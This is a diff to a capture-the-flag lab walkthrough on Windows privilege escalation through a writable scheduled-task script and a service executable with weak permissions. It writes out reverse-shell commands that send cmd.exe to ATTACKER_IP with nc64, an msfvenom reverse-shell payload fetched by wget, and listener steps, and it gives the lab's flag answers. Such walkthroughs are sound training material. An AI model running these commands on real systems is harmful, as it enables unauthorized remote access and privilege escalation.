@@ -103,29 +103,89 @@ Privilege escalation can be facilitated through misconfigurations, such as those
 2. AlwaysInstallElevated:
   - Windows Installer: MSI files can be set to run with elevated privileges if registry keys are configured. This allows unprivileged users to run an MSI that executes with administrator rights.
   - Registry Check: Use reg query to check if the necessary registry keys are set. If they are, generate a malicious MSI file using msfvenom and execute it with msiexec to get a reverse shell.
-### Q.1: What is the taskusr1 flag?
-Let’s start by getting info on the scheduled task called “vulntask”.
-```schtasks /query /tn vulntask /fo list /v```
+### Q: What is the taskusr1 flag?
+Let’s start by getting info on the scheduled task called “vulntask”. run the command in powershell: ```schtasks /query /tn vulntask /fo list /v```
 ![Finding info by vulntask](images/task_to_run.png)
 
-As discussed in the task description, we can edit the file if have the correct permissions. To check these we run the following command: ```icacls c:\tasks\schtask.bat```
-![See the permissions](images/icacls_schtask.bat.png)
-We have correct permission
+As discussed in the task description, we can edit the file if have the correct permissions. To check the permission, run the following command: ```icacls c:\tasks\schtask.bat```
 
-Now all we need to do is echo the nc64 command to the schtask.bat file to overwrite its content. Remember to change the ip.
+![See the permissions](images/icacls_schtask.bat.png)
+
+We have correct permission. As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the **.bat** file and insert any payload we like.
+
+Now all we need to do is **echo** the nc64 command to the **schtask.bat** file to overwrite its content in **cmd**. Remember to change the ip of local machine: 
+
 ```echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat```
 
 And setup a listener on your attacker machine: ```nc -lvnp 4444```
 
 Finally, run the scheduled task with: ```schtasks /run /tn vulntask```
+
 ![scheduled task](images/cmd_exc.png)
-Running the scheduled task
 
-And yes, we got a connection:
+yes, we got a connection:
+
 ![connected in netcat](images/got_nc_connection.png)
-We got a connection
 
-And find the flag:
+Now we've to find the flag:
+
 ![Flag](images/flag_text.png)
-Another flag in the house
+
 #### Answer: THM{TASK_COMPLETED}
+
+## Task 4: Abusing Service Misconfigurations
+
+This part covers three different service misconfigurations, and each vulnerability has a question related to it.
+
+Windows services are managed by the Service Control Manager (SCM), which controls service states and configurations. Each service has an associated executable and a user account it runs under. Services are configured in the Windows registry, and their executable path and associated account are specified there. Permissions for services are controlled via a Discretionary Access Control List (DACL), determining who can start, stop, or configure the service.
+
+Insecure Permissions on Service Executables: If a service’s executable has weak permissions, attackers can replace it with malicious payloads, gaining privileges of the service’s account. An example using Splinterware System Scheduler showed how to exploit a service by overwriting its executable, causing the service to run malicious code.
+
+Unquoted Service Paths: A vulnerability occurs when the service executable path is unquoted, allowing an attacker to insert their own executable before the intended one. If a service path has spaces but isn’t quoted, the SCM may misinterpret the command, potentially running an attacker’s executable instead. This can be exploited when services are installed in writable directories, allowing an attacker to place malicious executables in those locations.
+
+Exploitation: In both scenarios, attackers create and place malicious executables on the target system, manipulate service configurations or permissions, and gain elevated access through service misconfigurations.
+
+### Q.1: Get the flag on svcusr1’s desktop.
+Once again, we can follow the steps from the covered theory: ```sc qc WindowsScheduler```
+
+![Scheduled task](images/windows_scheduler_check.png)
+
+The binary path is mentioned. Now we check the permissions: ```icacls C:\PROGRA~2\SYSTEM~1\WService.exe```
+
+![cheacking permission](images/checking_permission.png)
+
+The Everyone group has modify permissions (M) on the service’s executable. This means we can simply overwrite it with any payload of our preference, and the service will execute with privileges of the configured user account.
+Now we need to fulfil the following tasks:
+1. Create a reverse shell payload on the local machine: ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe```
+
+![exploit](images/msfvenom_exploit.png)
+
+2. Setup a Python web server at our local machine: ```python3 -m http.server```
+3. Get the binary from the attacker machine into our target(thm lab): ```wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe```
+
+![download the exploit](images/download_exe_file.png)
+
+4.  On the target machine, rename the original binary, move the payload to its location and give the right permissions (making sure you are using Powershell):
+
+![WService](images/wservice_binary.png)
+
+5. On your attacker machine, setup a reverse listener: ```nc -lvnp 4445```
+6.  On the target machine, startup the task:
+```
+sc stop windowsscheduler
+sc start windowsscheduler
+```
+![startup task](images/sc_stop_start.png)
+
+7. Startup a listener and receiving a shell:
+
+![Receving shell](images/receving_shell.png)
+
+Now we are connected, we've to find the flag following command: ```dir \flag.txt /s /p```
+
+![Finding flag](images/find_flag_cmmnd.png)
+
+We found it. Now read the flag:
+
+![Read the flag](images/flag_text_2.png)
+#### Answer: THM{AT_YOUR_SERVICE}
